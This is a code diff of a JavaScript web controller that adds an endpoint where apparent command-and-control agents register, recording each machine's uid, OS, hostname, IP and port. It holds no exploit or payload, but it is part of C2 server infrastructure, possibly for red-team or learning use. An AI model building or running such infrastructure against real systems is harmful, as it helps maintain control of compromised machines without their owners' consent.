@@ -1,20 +1,32 @@
 'use strict'
+const c2  = use('App/Models/C2')
+const helper = use('App/Helpers/Helper')
+const Helper = new helper() 
 
 class RegisterController {
 
-    async registerC2({view,auth,response,request}){
-        console.log("TESt")
-        console.log(request.body)
+    async registerC2({response,request}){
 
-        
-        response.status(200)
-    }
+        let newC2 = new c2()
 
-    async show({view,auth,response,request}){
-        console.log("TESt")
-        console.log(request.body)
+        newC2.uid = Helper.sanitizer(request.input('uid'))
+        newC2.os = Helper.sanitizer(request.input('os'))
+        newC2.hostname = Helper.sanitizer(request.input('hostname'))
+        newC2.ip = Helper.sanitizer(request.input('ip'))
+        newC2.port = Helper.sanitizer(request.input('port'))
 
-        return view.render("c2.register")
+        try {
+            
+            await newC2.save()
+
+            response.status(200)
+
+        } catch (error) {
+
+            response.status(400).send("Error!")
+
+        }
+
     }
 
 }
